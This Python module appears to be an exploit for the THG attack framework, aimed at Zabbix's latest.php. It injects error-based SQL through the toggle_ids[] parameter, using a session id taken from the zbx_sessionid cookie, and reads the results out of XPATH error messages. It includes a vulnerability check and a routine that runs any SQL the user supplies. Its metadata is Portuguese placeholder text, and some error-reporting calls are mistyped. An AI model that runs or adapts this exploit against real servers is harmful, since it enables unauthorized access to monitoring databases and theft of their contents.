import re
import requests
from THG.Model.Xmode.exploit.BaseExploit import BaseExploit
from THG.Model.BaseXmodeClass.BaseOption import BaseOption


class Exploit(BaseExploit):
    def __init__(self):
        super(Exploit, self).__init__()
        self.update_info({
            "name": "teste THG nome",
            "description": "teste THG descricao",
            "author": ["teste THG autor"],
            "references": [
                "xxxxx1",
                "xxxxx2",
                "xxxxx3",
                "xxxxx4",
            ],
            "disclosure_date": "teste THG data",
            "service_name": "teste THG nome servico",
            "service_version": "teste THG autor versao",
        })
        self.register_http_target()
        self.register_options([
            BaseOption(
                name="SQL",
                required=True,
                description="The SQL statement you want to execute",
                value="updatexml(0,concat(0xa,user()),0)"
            )
        ])

    def check(self):
        url = self.options.get_option("URL")
        try:
            session = requests.session()
            response = session.get(url)
            zbx_sessionid = response.cookies.get("zbx_sessionid")
            sessionid = zbx_sessionid[-16:]
            check_response = session.get("{url}/latest.php?output=ajax&sid="
                                         "{sessionid}&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,"
                                         "concat(0xa,password(123)),0)".format(url=url, sessionid=sessionid))
            if "23AE809DDACAF96AF0FD78ED04B6A2" in check_response.text:
                self.results.success("URL:{} has the vulnerability".format(url))
            else:
                self.results.failure("URL:{} does not have this vulnerability".format(url))
        except TypeError:
            self.results.failure("URL:{} Maybe not zabbix? not found zbx_sessionid".format(url))
        except Exception as e:
            self.results.failure("URL:{} does not have this vulnerability, error:{}", format(url, str(e)))
        return self.results

    def exploit(self):
        url = self.options.get_option("URL")
        sql = self.options.get_option("SQL")
        try:
            session = requests.session()
            response = session.get(url)
            zbx_sessionid = response.cookies.get("zbx_sessionid")
            sessionid = zbx_sessionid[-16:]
            exploit_response = session.get(
                "{url}/latest.php?output=ajax&sid={sessionid}&favobj=toggle&toggle_open_state=1&toggle_ids[]={sql}".format(
                    url=url,
                    sessionid=sessionid,
                    sql=sql,
                ))
            exploit_result_text = re.search(
                r"\[XPATH syntax error: '</li><li>(.*?)'\]</li></ul>",
                exploit_response.text
            ).group(1)
            self.results.success(message="Exploit result: {}".format(exploit_result_text))
        except TypeError:
            self.results.failure("URL:{} Maybe not zabbix? not found zbx_sessionid".format(url))
        except Exception as e:
            self.results.failure("URL:{} does not have this vulnerability, error:{}", format(url, str(e)))
        finally:
            return self.results